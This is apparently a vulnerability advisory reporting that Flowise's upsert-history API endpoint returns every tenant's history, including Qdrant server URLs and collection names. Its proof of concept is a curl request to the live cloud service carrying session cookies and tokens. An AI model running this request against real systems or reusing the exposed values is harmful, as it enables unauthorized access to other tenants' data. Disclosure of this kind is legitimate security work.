summary: "Flowise: Information Disclosure in GET /api/v1/upsert-history returns the entire server-wide\
  \ upsert history\n### Summary\nThe **GET `/api/v1/upsert-history`** endpoint returns the **entire\
  \ server-wide upsert history** (response size **>100MB**) instead of being scoped to the requesting\
  \ user/tenant/workspace. The response includes **sensitive configuration data** (e.g., Vector\
  \ Store settings such as **Qdrant Server URL** and **collection name**), resulting in a **High\
  \ severity information disclosure** that may enable further targeted attacks.\n\n### Details\n\
  - **Affected endpoint:** `GET /api/v1/upsert-history`\n- **Observed behavior:** The API returns\
  \ **global upsert history for the whole server**, indicating missing/insufficient:\n  - Authorization\
  \ checks (RBAC/user-based access control)\n  - Data scoping (workspace/project/tenant isolation)\n\
  \  - Pagination/limits (excessive data exposure and very large responses)\n- **Sensitive data\
  \ exposure:** The returned history contains integration parameters and infrastructure details.\
  \ Example excerpt from the response:\n  ```json\n  {\n    \"label\": \"Qdrant\",\n    \"name\"\
  : \"qdrant\",\n    \"category\": \"Vector Stores\",\n    \"id\": \"qdrant_0\",\n    \"paramValues\"\
  : [\n      {\n        \"label\": \"Qdrant Server URL\",\n        \"name\": \"qdrantServerUrl\"\
  ,\n        \"type\": \"string\",\n        \"value\": \"https://7f60f255-f7fd-4a1c-a734-fbcf904f9f85.europe-west3-0.gcp.cloud.qdrant.io\"\
  \n      },\n      {\n        \"label\": \"Qdrant Collection Name\",\n        \"name\": \"\
  qdrantCollection\",\n        \"type\": \"string\",\n        \"value\": \"fair-herring-azure\"\
  \n      },\n      {\n        \"label\": \"Vector Dimension\",\n        \"name\": \"qdrantVectorDimension\"\
  ,\n        \"type\": \"number\",\n        \"value\": 1536\n      },\n      {\n        \"label\"\
  : \"Content Key\",\n        \"name\": \"contentPayloadKey\",\n        \"type\": \"string\"\
  ,\n        \"value\": \"content\"\n      },\n      {\n        \"label\": \"Metadata Key\"\
  ,\n        \"name\": \"metadataPayloadKey\",\n        \"type\": \"string\",\n        \"value\"\
  : \"metadata\"\n      },\n      {\n        \"label\": \"Similarity\",\n        \"name\": \"\
  qdrantSimilarity\",\n        \"type\": \"options\",\n        \"value\": \"Cosine\"\n     \
  \ }\n    ]\n  }\n\n### POC \n\n1. Using `curl` and call the enpoint `GET  /api/v1/upsert-history`,\
  \ sever returns the **entire server-wide upsert history**\n```\ncurl 'https://cloud.flowiseai.com/api/v1/upsert-history'\
  \   -X GET   -H 'Host: cloud.flowiseai.com'   -H 'Accept: application/json, text/plain, */*'\
  \   -H 'Accept-Language: en-US,en;q=0.9'   -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux\
  \ x86_64; rv:147.0) Gecko/20100101 Firefox/147.0'   -H 'X-Request-From: internal'   -H 'Referer:\
  \ https://cloud.flowiseai.com/document-stores/vector/27d7e649-72c9-4333-836f-0a32b7ecda57/719bc75c-5810-4d22-aa03-35c7831b8819'\
  \   -H 'If-None-Match: W/\"156-Xbc+zqRKlJRZDUydYMybuU4SQnY\"'   -H 'Connection: keep-alive'\
  \   -H 'Cookie: _ga_DG9QMLV4DR=GS2.1.s1773632276$o1$g0$t1773632915$j60$l0$h0; _ga=GA1.1.938844242.1773632276;\
  \ cf_clearance=Ug4PTMCbO8G.9n7ibaRBT.Y74flswLTgbR6V4qQbKUE-1773715307-1.2.1.1-2XGkql2bE8imFOsQJuw0x8yM9XW7QWbEe8ALEZ39Bm03kZu.vJLusY5_cRurAooKcK0XuqTjWgibQXYwWF91LbQZIXFefNzXuz6f8O7VzY5VM_h9p0_xICarIdDdB0hWfriItN1qbu00tqEmDgE_v2biNpNETXF3nC0wByJmhNWOcSh95lBd_Q5vALJQ0hc7pzhbPh.OuLbLtcCOlEv1YbwZWMSynj3hglpCeVkWqkM;\
  \ connect.sid=s%3Axrkhl0YSNjvydmo24ASe3ezLStuedRCv.JABLEZmfWP74D9zGvFyDEELHFXqvDxHRnN3mJBhsKX8;\
  \ token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..UDFurQPA6-bKQ7mZg0Qetu6yAv1UK3vaz27ZUhUoamc;\
  \ refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..0HlslRzoFo0Tlt4Jbn9gnEwsQej4ilMd8qjhLBZQO5Q;\
  \ __cf_bm=.BG97WtFqwwk0DMVJB1BlcHRdhQv70bLu4f_QpH5qo4-1773721030-1.0.1.1-IwhUPW6O9uNcNsOZl7LLgpnm8_ll18rzoOFu085wZQQgTvVvaPwVFJObxSJ1.NRyS5MWsRbJi1BhUNMTJjSR2s9EyuSBzn2s_eXblq8rTh8'\
  \   --compressed   -sS -o resp.json\n```\n2. Verify the response size (expected: very large,\
  \ e.g., >100MB)\n```\nls -lh resp.json\n```\n\n### Impact\n- **Vulnerability type:** Information\
  \ Disclosure / Broken Access Control (missing authorization and/or missing tenant/workspace\
  \ scoping)\n- **Who is impacted:** All users/tenants/workspaces whose upsert history and configuration\
  \ data are included in the server-wide history\n- **Security consequences:**\n  - Exposure\
  \ of infrastructure/integration details (e.g., Qdrant endpoint URLs, collection names, vector\
  \ dimensions), enabling reconnaissance and targeted follow-up attacks\n  - Leakage of internal\
  \ schema/pipeline details (e.g., content/metadata keys)\n  - Potential resource abuse: repeated\
  \ downloads of a >100MB response can increase bandwidth/CPU/memory load (amplifying DoS risk)"
